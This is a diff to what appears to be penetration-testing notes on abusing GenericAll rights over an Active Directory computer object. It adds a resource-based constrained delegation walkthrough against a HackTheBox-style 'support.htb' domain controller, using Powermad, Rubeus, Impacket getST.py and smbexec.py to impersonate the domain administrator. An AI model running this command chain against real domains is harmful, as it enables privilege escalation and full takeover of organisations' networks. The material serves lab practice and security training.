@@ -67,7 +67,9 @@ net group "domain admins" <username> /add /domain
 
 ### GenericAll on Computer
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+A common attack with generic all on a computer object is to add a fake computer to the domain.
+
+<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 If enumerating and we see a user has GenericAll permission on a computer we know we full control.
 
@@ -77,9 +79,15 @@ We can perform a <mark style="color:yellow;">**Kerberos Resourced Based Constrai
 
 
 
-### Resource Based Constrained Delegation Attack
+## Abusing GenericAll Computer Object Kerberoast Ticket Abuse
+
+###
+
+### Also known as: "Resource Based Constrained Delegation Attack"
 
 We will be following this guide [https://github.com/tothi/rbcd-attack](https://github.com/tothi/rbcd-attack)
+
+### Toshi's "Impacket" method.
 
 ### Add Computer to Domain
 
@@ -102,8 +110,6 @@ impacket-addcomputer -computer-name 'COMPUTER$' -computer-pass 'SomePassword' -d
 # Delete a computer account
 impacket-addcomputer -computer-name 'COMPUTER$' -dc-host $DomainController -delete 'DOMAIN\user:password'
 </code></pre>
-
-####
 
 ### Toshi's rbcd attack
 
@@ -142,4 +148,62 @@ After adding the file path to the KRB5CCNAME variable the ticket is usable for K
 ```
 export KRB5CCNAME=`pwd`/admin.ccache
 klist
+```
+
+
+
+
+
+### Server Side Method
+
+Here is another way to abuse GenericAll on a computer group
+
+```powershell
+# -------- On Server Side
+# Upload tools
+upload /home/user/Tools/Powermad/Powermad.ps1 pm.ps1
+upload /home/user/Tools/Ghostpack-CompiledBinaries/Rubeus.exe r.exe
+
+# Import PowerMad
+Import-Module ./pm.ps1
+
+# Set variables
+Set-Variable -Name "FakePC" -Value "FAKE01"
+Set-Variable -Name "targetComputer" -Value "DC"
+
+# With Powermad, Add the new fake computer object to AD.
+New-MachineAccount -MachineAccount (Get-Variable -Name "FakePC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+
+# With Built-in AD modules, give the new fake computer object the Constrained Delegation privilege.
+Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakePC").Value + '$')
+
+# With Built-in AD modules, check that the last command worked.
+Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties PrincipalsAllowedToDelegateToAccount
+```
+
+
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+```powershell
+# With Rubeus, generate the new fake computer object password hashes. 
+#  Since we created the computer object with the password 123456 we will need those hashes
+#  for the next step.
+./r.exe hash /password:123456 /user:FAKE01$ /domain:support.htb
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+```powershell
+# -------- On Attck Box Side.
+# Using getTGT from Impacket, generate a ccached TGT and used KERB5CCNAME pass the ccahe file for the requested service. 
+#   If you are getting errors, "cd ~/impacket/", "python3 -m pip install ."
+/home/user/Tools/impacket/examples/getST.py support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B
+
+# Set local variable of KERB5CCNAME to pass the ccahe TGT file for the requested service.
+export KRB5CCNAME=administrator.ccache
+
+# Use smbexec.py to connect with the TGT we just made to the server as the user administrator 
+#  over SMB protocol.
+smbexec.py support.htb/administrator@dc.support.htb -no-pass -k
 ```
